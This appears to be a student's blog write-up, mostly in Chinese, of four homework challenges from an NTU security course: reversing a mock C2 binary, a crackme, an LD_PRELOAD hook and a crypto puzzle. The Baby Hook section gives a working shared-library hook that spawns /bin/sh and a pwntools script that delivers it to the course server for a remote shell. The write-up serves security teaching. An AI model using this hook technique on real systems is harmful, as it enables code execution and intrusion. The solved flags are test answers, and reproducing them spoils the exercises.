<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  NTU CS HW0 Write Up
  #

:::spoiler TOC
[TOC]
:::

  Easy C2
  #


Flag: FLAG{C2_cmd_in_http_header}


  Description
  #

我們獵捕到一隻惡意程式，它似乎有與 C2 進行互動的行為。請找出它發送給 C2 的訊息。Flag 格式為：FLAG{&mldr;}。
此題模仿惡意程式與 C2 進行溝通的行為，期望能在對不熟悉逆向的同學而言不過度困難的情況下，讓同學對惡意程式行為有初步的認識。題目本身並沒有實際的惡意或影響系統運作的行為，因此可以安心執行。建議同學可以先嘗試執行程式，觀察程式的行為，嘗試找出 C2 位址以及如何與其溝通。
Google 關鍵字：IDA freeware、Ghidra、malware C2

  解題思路
  #


Simple 解題思路
$ file easy-c2
easy-c2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8fa6ee42a706cfc93d97d04b3ff5e300b9f8ae02, for GNU/Linux 3.2.0, with debug_info, not stripped

IDA
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int sockfd; // [rsp+1Ch] [rbp-24h]
  char *flag; // [rsp+20h] [rbp-20h] BYREF
  char *enc_flag; // [rsp+28h] [rbp-18h]
  char *host; // [rsp+30h] [rbp-10h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  enc_flag = byte_20F0;
  host = "127.0.0.1";
  sockfd = socket_connect("127.0.0.1", 11187);
  decode_flag(&amp;flag, byte_20F0);
  send_msg(sockfd, flag);
  puts("Message sent.");
  sleep(1u);
  free(flag);
  close(sockfd);
  return 0;
}
可以看得出來他會連localhost:11187，然後把decode過後的flag給送出去，所以只要會nc的都可以直接聽該port的訊息


  Exploit
  #

$ nc -lvp 11187
Listening on 0.0.0.0 11187
Connection received on localhost 54028
GET / HTTP/1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko, FLAG{C2_cmd_in_http_header}) Chrome/51.0.2704.103 Safari/537.36

  Baby Crackme
  #


Flag: FLAG{r0ll1ng_4nd_3xtr4ct_t0_m3m0ry}


  Description
  #

透過此題目希望學生們可以先自行摸索過各種 SRE(Software Reverse-Engineering) 的工具與流程。 給你一些關鍵字用: IDA Freeware, Ghidra, gdb (GNU Debugger), Dynamic Analysis'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="NTU CS HW0 Write Up"><meta property="og:description" content='NTU CS HW0 Write Up # :::spoiler TOC [TOC] :::
Easy C2 # Flag: FLAG{C2_cmd_in_http_header} Description # 我們獵捕到一隻惡意程式，它似乎有與 C2 進行互動的行為。請找出它發送給 C2 的訊息。Flag 格式為：FLAG{…}。 此題模仿惡意程式與 C2 進行溝通的行為，期望能在對不熟悉逆向的同學而言不過度困難的情況下，讓同學對惡意程式行為有初步的認識。題目本身並沒有實際的惡意或影響系統運作的行為，因此可以安心執行。建議同學可以先嘗試執行程式，觀察程式的行為，嘗試找出 C2 位址以及如何與其溝通。
Google 關鍵字：IDA freeware、Ghidra、malware C2
解題思路 # Simple 解題思路 $ file easy-c2 easy-c2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8fa6ee42a706cfc93d97d04b3ff5e300b9f8ae02, for GNU/Linux 3.2.0, with debug_info, not stripped IDA int __cdecl main(int argc, const char **argv, const char **envp) { int sockfd; // [rsp+1Ch] [rbp-24h] char *flag; // [rsp+20h] [rbp-20h] BYREF char *enc_flag; // [rsp+28h] [rbp-18h] char *host; // [rsp+30h] [rbp-10h] unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(0x28u); enc_flag = byte_20F0; host = "127.0.0.1"; sockfd = socket_connect("127.0.0.1", 11187); decode_flag(&amp;flag, byte_20F0); send_msg(sockfd, flag); puts("Message sent."); sleep(1u); free(flag); close(sockfd); return 0; } 可以看得出來他會連localhost:11187，然後把decode過後的flag給送出去，所以只要會nc的都可以直接聽該port的訊息 Exploit # $ nc -lvp 11187 Listening on 0.0.0.0 11187 Connection received on localhost 54028 GET / HTTP/1.0 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko, FLAG{C2_cmd_in_http_header}) Chrome/51.0.2704.103 Safari/537.36 Baby Crackme # Flag: FLAG{r0ll1ng_4nd_3xtr4ct_t0_m3m0ry} Description # 透過此題目希望學生們可以先自行摸索過各種 SRE(Software Reverse-Engineering) 的工具與流程。 給你一些關鍵字用: IDA Freeware, Ghidra, gdb (GNU Debugger), Dynamic Analysis'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Welcome"><meta property="article:tag" content="Eductf"><title>NTU CS HW0 Write Up | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>NTU CS HW0 Write Up</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#easy-c2>Easy C2</a><ul><li><a href=#description>Description</a></li><li><a href=#解題思路>解題思路</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#baby-crackme>Baby Crackme</a><ul><li><a href=#description-1>Description</a></li><li><a href=#解題思路-1>解題思路</a></li><li><a href=#exploit-1>Exploit</a></li></ul></li><li><a href=#baby-hook>Baby Hook</a><ul><li><a href=#description-2>Description</a></li><li><a href=#解題思路-2>解題思路</a></li><li><a href=#exploit-2>Exploit</a></li></ul></li><li><a href=#extreme-xorrrrr>Extreme Xorrrrr</a><ul><li><a href=#description-3>Description</a></li><li><a href=#source-code>Source Code</a></li><li><a href=#解題思路-3>解題思路</a></li><li><a href=#exploit-3>Exploit</a></li></ul></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=ntu-cs-hw0-write-up>NTU CS HW0 Write Up
<a class=anchor href=#ntu-cs-hw0-write-up>#</a></h1><p>:::spoiler TOC
[TOC]
:::</p><h2 id=easy-c2>Easy C2
<a class=anchor href=#easy-c2>#</a></h2><ul><li>Flag: <code>FLAG{C2_cmd_in_http_header}</code></li></ul><h3 id=description>Description
<a class=anchor href=#description>#</a></h3><p>我們獵捕到一隻惡意程式，它似乎有與 C2 進行互動的行為。請找出它發送給 C2 的訊息。Flag 格式為：FLAG{&mldr;}。
此題模仿惡意程式與 C2 進行溝通的行為，期望能在對不熟悉逆向的同學而言不過度困難的情況下，讓同學對惡意程式行為有初步的認識。題目本身並沒有實際的惡意或影響系統運作的行為，因此可以安心執行。建議同學可以先嘗試執行程式，觀察程式的行為，嘗試找出 C2 位址以及如何與其溝通。</p><p>Google 關鍵字：IDA freeware、Ghidra、malware C2</p><h3 id=解題思路>解題思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af>#</a></h3><ol><li>Simple 解題思路<pre tabindex=0><code class=language-bash! data-lang=bash!>$ file easy-c2
easy-c2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8fa6ee42a706cfc93d97d04b3ff5e300b9f8ae02, for GNU/Linux 3.2.0, with debug_info, not stripped
</code></pre></li><li>IDA<pre tabindex=0><code class=language-cpp! data-lang=cpp!>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int sockfd; // [rsp+1Ch] [rbp-24h]
  char *flag; // [rsp+20h] [rbp-20h] BYREF
  char *enc_flag; // [rsp+28h] [rbp-18h]
  char *host; // [rsp+30h] [rbp-10h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  enc_flag = byte_20F0;
  host = &#34;127.0.0.1&#34;;
  sockfd = socket_connect(&#34;127.0.0.1&#34;, 11187);
  decode_flag(&amp;flag, byte_20F0);
  send_msg(sockfd, flag);
  puts(&#34;Message sent.&#34;);
  sleep(1u);
  free(flag);
  close(sockfd);
  return 0;
}
</code></pre>可以看得出來他會連localhost:11187，然後把decode過後的flag給送出去，所以只要會nc的都可以直接聽該port的訊息</li></ol><h3 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h3><pre tabindex=0><code class=language-bash! data-lang=bash!>$ nc -lvp 11187
Listening on 0.0.0.0 11187
Connection received on localhost 54028
GET / HTTP/1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko, FLAG{C2_cmd_in_http_header}) Chrome/51.0.2704.103 Safari/537.36
</code></pre><h2 id=baby-crackme>Baby Crackme
<a class=anchor href=#baby-crackme>#</a></h2><ul><li>Flag: <code>FLAG{r0ll1ng_4nd_3xtr4ct_t0_m3m0ry}</code></li></ul><h3 id=description-1>Description
<a class=anchor href=#description-1>#</a></h3><p>透過此題目希望學生們可以先自行摸索過各種 SRE(Software Reverse-Engineering) 的工具與流程。 給你一些關鍵字用: IDA Freeware, Ghidra, gdb (GNU Debugger), Dynamic Analysis</p><h3 id=解題思路-1>解題思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af-1>#</a></h3><ol><li><p>Simple 解題思路</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ file baby-crackme
baby-crackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6cc98ffd919e39311d3014a8bd77c2c8968ca2a9, for GNU/Linux 3.2.0, stripped
$ ./baby-crackme
========= Baby Validating Service =========
Enter the license &gt;1234
Invalid license!
</code></pre></li><li><p>IDA
:::spoiler IDA Decompile Code(Main Function)</p><pre tabindex=0><code class=language-cpp! data-lang=cpp!>__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 input_flag[4]; // [rsp+0h] [rbp-30h] BYREF
  int v5; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  memset(input_flag, 0, sizeof(input_flag));
  v5 = 0;
  puts(&#34;========= Baby Validating Service =========&#34;);
  printf(&#34;Enter the license &gt;&#34;);
  __isoc99_scanf(&#34;%35s&#34;, input_flag);
  if ( scan_license(input_flag, 36LL, 0xBACEB00CLL) )
    puts(&#34;Valid license!&#34;);
  else
    puts(&#34;Invalid license!&#34;);
  return 0LL;
}
</code></pre><p>:::
:::spoiler IDA Decompile Code(Scan License)</p><pre tabindex=0><code class=language-cpp! data-lang=cpp!>_BOOL8 __fastcall scan_license(const char *input_flag, int a2, int _0xBACEB00C)
{
  unsigned __int8 v5; // [rsp+1Bh] [rbp-35h]
  int i; // [rsp+1Ch] [rbp-34h]
  char s1[8]; // [rsp+20h] [rbp-30h] BYREF
  __int64 v8; // [rsp+28h] [rbp-28h]
  __int64 v9; // [rsp+30h] [rbp-20h]
  __int64 v10; // [rsp+38h] [rbp-18h]
  int v11; // [rsp+40h] [rbp-10h]
  unsigned __int64 v12; // [rsp+48h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  *s1 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0;
  for ( i = 0; i &lt; a2; ++i )
  {
    v5 = enc_flag[i];
    s1[i] = v5 ^ _0xBACEB00C;
    _0xBACEB00C = a2 - i + (v5 ^ __ROR4__(_0xBACEB00C, 1));
  }
  return strcmp(s1, input_flag) == 0;
}
</code></pre><p>:::</p></li><li><p>如果按照上面得到的code寫script會出事，具體來說會出啥事不好說，但總之IDA時不時會翻不出來也見怪不怪，反正有問題一率動態跟，至於要跟到哪裡(因為沒有main symbol，所以也不好定位)，我是直接用pwntools的raw_input()強制斷在input的地方，接著就跳到比對的部分，然後flag就出現在stack上了</p></li></ol><h3 id=exploit-1>Exploit
<a class=anchor href=#exploit-1>#</a></h3><pre tabindex=0><code class=language-bash! data-lang=bash!>$ gdb
gef➤ at {PID}
gef➤ fin # until to scan_license function
gef➤ b *{PIE base address}26f
gef➤ c
</code></pre><h2 id=baby-hook>Baby Hook
<a class=anchor href=#baby-hook>#</a></h2><ul><li>Flag: <code>FLAG{B4by_Ld_Pr3L0aD_L1bR1rY_:)}</code></li></ul><h3 id=description-2>Description
<a class=anchor href=#description-2>#</a></h3><p>Try to Hook Me :)</p><p>nc edu-ctf.zoolab.org 10002
Flag Format：FLAG{&mldr;}</p><h3 id=解題思路-2>解題思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af-2>#</a></h3><p>這一題主要的想法很簡單，就是給他一個so file，然後她會直接用這個so file當作LD_PRELOAD，執行./chall，所以我們要做的事情概念很簡單，就是給他一個有問題的so file，然後當他執行椅面的function時，就會執行我們給他的惡意指令，例如開shell</p><h3 id=exploit-2>Exploit
<a class=anchor href=#exploit-2>#</a></h3><pre tabindex=0><code class=language-cpp! data-lang=cpp!>#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;dlfcn.h&gt;

#define unlikely(x) __builtin_expect(!!(x), 0)
#define TRY_LOAD_HOOK_FUNC(name) if (unlikely(!g_sys_##name)) {g_sys_##name = (sys_##name##_t)dlsym(RTLD_NEXT,#name);}


typedef void* (*sys_sleep_t)(size_t size);
static sys_sleep_t g_sys_sleep = NULL;
void* sleep(size_t size)
{
    execve(&#34;/bin/sh&#34;, (char *[]){0}, (char *[]){0});
    return p;
}
</code></pre><pre tabindex=0><code class=language-python! data-lang=python!>from base64 import b64encode
from pwn import *

ld_file = open(&#39;./libmyhook.so&#39;, &#39;rb&#39;).read()
# r = process([&#39;python&#39;, &#39;./main.py&#39;])
r = remote(&#39;edu-ctf.zoolab.org&#39;, 10002)

print(r.recvline())
raw_input()
r.sendline(b64encode(ld_file))
# print(b64encode(ld_file))

r.interactive()
</code></pre><pre tabindex=0><code class=language-bash! data-lang=bash!>$ gcc -fPIC -shared -o libmyhook.so exp-hook.c -ldl
$ LD_PRELOAD=./libmyhook.so ./chall    # To make sure it&#39;s working
$ python exp.py
[+] Opening connection to edu-ctf.zoolab.org on port 10002: Done
b&#39;Give me your share object:\n&#39;

[*] Switching to interactive mode
$ ls
Makefile
chall
chall.c
flag.txt
main.py
run.sh
$ cat flag.txt
FLAG{B4by_Ld_Pr3L0aD_L1bR1rY_:)}
</code></pre><p>我是直接參考<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>的教學，非常淺顯易懂，而且還有給sample code，做的事情簡單來說就和上面提到的一樣，當它call sleep時，就會直接執行execve開shell給我，另外這篇<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>的教學冶獎的很好</p><h2 id=extreme-xorrrrr>Extreme Xorrrrr
<a class=anchor href=#extreme-xorrrrr>#</a></h2><ul><li>Flag: <code>flag{xor_ThEN_>&lt;OR_1qUal_ZEr0}</code></li></ul><h3 id=description-3>Description
<a class=anchor href=#description-3>#</a></h3><p>Easy crypto problem with simple tricks.</p><p>Flag Format: FLAG{&mldr;}</p><h3 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h3><p>:::spoiler Source Code</p><pre tabindex=0><code class="language-python=" data-lang="python=">from secret import flag
from Crypto.Util.number import bytes_to_long, getPrime

def xorrrrr(nums):
    n = len(nums)
    result = [0] * n
    for i in range(1, n):
        result = [ result[j] ^ nums[(j+i) % n] for j in range(n)]
    return result

secret = bytes_to_long(flag)
mods = [ getPrime(32) for i in range(20)]
muls = [ getPrime(20) for i in range(20)]

hint = [secret * muls[i] % mods[i] for i in range(20)]

print(f&#34;hint = {xorrrrr(hint)}&#34;)
print(f&#34;muls = {xorrrrr(muls)}&#34;)
print(f&#34;mods = {xorrrrr(mods)}&#34;)

# hint = [3867643078, 3287416726, 901811051, 2873881227, 2270268909, 1555321936, 1419723682, 135531391, 1648732744, 2346142192, 1505498859, 2103436123, 4202619523, 2326904236, 1938136472, 366121018, 773968139, 2415223764, 490067400, 1902082872]
# muls = [784927, 1022769, 932825, 746975, 815007, 613147, 537543, 852211, 618443, 866769, 910981, 825227, 838133, 1027271, 776063, 1038141, 571529, 664495, 1025729, 593197]
# mods = [2286703839, 2358297603, 3964421567, 3907762623, 2849800663, 2382674777, 2503252379, 2798053355, 3995552795, 2910773165, 3724203063, 2416156797, 2179309517, 3641528223, 2846518171, 2688752197, 4248246955, 2871652981, 2639686887, 4182550363]
</code></pre><p>:::</p><h3 id=解題思路-3>解題思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af-3>#</a></h3><p>我真的脫離crypto太久了，久沒做題就生疏了，這題其實也&mldr;沒那麼難，應該還是有點難啦</p><ol><li>Analyze Process
首先這題做的事情很簡單，他先取得mods/muls各20組質數的list，然後和flag進行運算
$$
hint[0] = secret*muls[0]\ %\ mods[0] \
&mldr;
$$
最後他有給經過scramble的hint/muls/mods，所以首要做的事情是把scramble後的結果還原</li><li>Descramble
他做的事情其實很簡單，靜態看不太出來，動態跟一下就出現了，basically他就是做十九次，每一次都跟隔壁的element進行xor，例如：<code>muls[0, 1, 2, 3,..., 19]</code>，scramble的結果會變成
$$
muls[1\oplus 2\oplus 3\oplus &mldr;\oplus 19,\
2\oplus 3\oplus 4\oplus &mldr;\oplus 19\oplus 0,\
3\oplus 4\oplus 5\oplus &mldr;\oplus 19\oplus 0\oplus 1,&mldr;]
$$
所以可以看得出來，因為只做19次，scramble後的第一個element缺少原本的element 0，而第二個element缺少原本的element 1，以此類推，所以要還原就很簡單了，我先把scramble後的所有element全部XOR，這樣就可以得到$0\oplus 1\oplus 2\oplus 3\oplus &mldr;\oplus 19$的結果，然後再各自和scramble的element進行XOR，就可以extract出最一開始的element是多少
$$
Scrambled element = 1\oplus 2\oplus 3\oplus &mldr;\oplus 19\
\oplus\
All\ element\ XOR = 0\oplus 1\oplus 2\oplus 3\oplus &mldr;\oplus 19\
=original\ element\ 0
$$</li><li>Decrypt Flag
有了hint/mods/muls最原始的這些東西，就可以開始想要怎麼藉由hint解密原本的flag，如果把整個equation換個表示式
$$
hint[0] = secret<em>muls[0]\ %\ mods[0] \
&mldr;\
=\
secret</em>muls[0]\equiv\ hint[0]\ (mod\ mods[0])\
secret<em>muls[1]\equiv\ hint[1]\ (mod\ mods[1])\
secret</em>muls[2]\equiv\ hint[2]\ (mod\ mods[2])\
&mldr;
$$
這和CRT有一點像，但CRT解的問題是secret都要一樣，所以只要把兩邊同乘以${muls[i]}^{-1}$就可以了
$$
secret\equiv\ hint[0]<em>{muls[0]}^{-1}\ (mod\ mods[0])\
secret\equiv\ hint[1]</em>{muls[1]}^{-1}\ (mod\ mods[1])\
secret\equiv\ hint[2]*{muls[2]}^{-1}\ (mod\ mods[2])\
&mldr;
$$
再利用CRT的解法，secret就出來了</li></ol><h3 id=exploit-3>Exploit
<a class=anchor href=#exploit-3>#</a></h3><pre tabindex=0><code class="language-python=" data-lang="python=">from Crypto.Util.number import *
from functools import reduce


def chinese_remainder(m, a):
    sum = 0
    prod = reduce(lambda acc, b: acc*b, m)
    for n_i, a_i in zip(m, a):
        p = prod // n_i
        sum += a_i * mul_inv(p, n_i) * p
    return sum % prod
 
def mul_inv(a, b):
    b0 = b
    x0, x1 = 0, 1
    if b == 1: return 1
    while a &gt; 1:
        q = a // b
        a, b = b, a%b
        x0, x1 = x1 - q * x0, x0
    if x1 &lt; 0: x1 += b0
    return x1

def de_xor(nums):
    result = []
    tmp = 0
    for i in range(len(nums)):
        tmp ^= nums[i]
    for i in range(len(nums)):
        result.append(tmp ^ nums[i])
    
    return result

def xorrrrr(nums):
    n = len(nums)
    result = [0] * n
    for i in range(1, n):
        result = [ result[j] ^ nums[(j+i) % n] for j in range(n)]
    return result

hint = [3867643078, 3287416726, 901811051, 2873881227, 2270268909, 1555321936, 1419723682, 135531391, 1648732744, 2346142192, 1505498859, 2103436123, 4202619523, 2326904236, 1938136472, 366121018, 773968139, 2415223764, 490067400, 1902082872]
muls = [784927, 1022769, 932825, 746975, 815007, 613147, 537543, 852211, 618443, 866769, 910981, 825227, 838133, 1027271, 776063, 1038141, 571529, 664495, 1025729, 593197]
mods = [2286703839, 2358297603, 3964421567, 3907762623, 2849800663, 2382674777, 2503252379, 2798053355, 3995552795, 2910773165, 3724203063, 2416156797, 2179309517, 3641528223, 2846518171, 2688752197, 4248246955, 2871652981, 2639686887, 4182550363]

Real_hint = de_xor(hint)
Real_muls = de_xor(muls)
Real_mods = de_xor(mods)

assert hint == xorrrrr(Real_hint)
assert muls == xorrrrr(Real_muls)
assert mods == xorrrrr(Real_mods)

count = 4
while(True):
    m = [Real_mods[i] for i in range(count)]
    a = [Real_hint[i]*inverse(Real_muls[i], Real_mods[i]) for i in range(count)]
    crt_result = chinese_remainder(m, a)
    if &#39;flag&#39; in long_to_bytes(crt_result).decode(&#34;cp437&#34;):
        print(&#39;Count = &#39;, count)
        print(long_to_bytes(crt_result).decode(&#34;cp437&#34;))
        break
    count += 1
</code></pre><p>經過實測，最少的CRT組合需要八組以上才能正確還原flag，其中CRT的部分是參考<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>，另外理論的部分是參考<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup>，最後inverse的靈感是來自<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup></p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://zhuanlan.zhihu.com/p/44132805>linux hook機制研究</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://jasonblog.github.io/note/fcamel/04.html>用 LD_PRELOAD 替換動態連結的函式庫</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href=https://medium.com/analytics-vidhya/chinese-remainder-theorem-using-python-25f051e391fc>Chinese Remainder Theorem Using Python</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p><a href="https://youtu.be/NkvCZ8qJ34w?si=HNryFu3AmhVWkNbP">從高中數學不再教的韓信點兵問題，講到大學數論的中國餘數定理，在講中國餘數定理在 RSA 密碼系統上的應用</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p><a href=https://chat.openai.com/c/cef2e550-d5fe-4ceb-96c4-0da3fc34de58>求且a的方法</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#easy-c2>Easy C2</a><ul><li><a href=#description>Description</a></li><li><a href=#解題思路>解題思路</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#baby-crackme>Baby Crackme</a><ul><li><a href=#description-1>Description</a></li><li><a href=#解題思路-1>解題思路</a></li><li><a href=#exploit-1>Exploit</a></li></ul></li><li><a href=#baby-hook>Baby Hook</a><ul><li><a href=#description-2>Description</a></li><li><a href=#解題思路-2>解題思路</a></li><li><a href=#exploit-2>Exploit</a></li></ul></li><li><a href=#extreme-xorrrrr>Extreme Xorrrrr</a><ul><li><a href=#description-3>Description</a></li><li><a href=#source-code>Source Code</a></li><li><a href=#解題思路-3>解題思路</a></li><li><a href=#exploit-3>Exploit</a></li></ul></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>